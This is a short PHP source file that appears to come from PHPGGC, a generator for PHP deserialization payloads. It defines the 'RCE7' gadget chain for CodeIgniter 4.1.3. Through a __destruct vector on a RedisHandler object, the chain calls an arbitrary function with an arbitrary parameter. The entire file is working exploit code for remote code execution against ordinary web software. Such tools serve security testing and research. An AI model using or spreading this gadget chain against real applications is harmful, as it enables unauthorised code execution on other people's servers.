<?php

namespace GadgetChain\CodeIgniter4;

class RCE7 extends \PHPGGC\GadgetChain\RCE\FunctionCall
{
    public static $version = '4.1.3';
    public static $vector = '__destruct';
    public static $author = 'CyanM0un';

    public function generate(array $parameters)
    {
        $function = $parameters['function'];
        $parameter = $parameters['parameter'];

        return new \CodeIgniter\Cache\Handlers\RedisHandler($function, $parameter);
    }
}
